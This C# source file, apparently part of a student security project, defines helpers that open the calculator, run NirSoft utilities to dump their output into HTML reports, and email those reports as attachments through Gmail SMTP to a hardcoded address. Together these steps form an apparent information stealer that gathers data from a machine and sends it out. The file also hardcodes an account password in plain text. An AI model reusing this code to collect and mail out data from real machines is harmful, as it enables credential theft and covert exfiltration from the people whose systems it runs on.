using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;

namespace TP
{
    internal class Helpers
    {
        public static void openCalc()
        {
            Process.Start("calc");
        }

        public static string execNirsoftTool(string executablePath)
        {
            string file = Path.GetFileNameWithoutExtension(executablePath).ToLower() + ".html";
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, executablePath);
            startInfo.Arguments = @"/shtml " + file;
            var process = Process.Start(startInfo);
            process.WaitForExit();
            return file;
        }

        public static void sendMail(string subject, string message, List<string> files)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("seginf2019@gmail.com");
            mail.To.Add("seginf2019@gmail.com");
            mail.Subject = subject;
            mail.Body = message;

            foreach (var file in files)
            {
                var attachment = new System.Net.Mail.Attachment(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file));
                mail.Attachments.Add(attachment);
            }

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("seginf2019@gmail.com", "sonrisita");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
        }
    }
}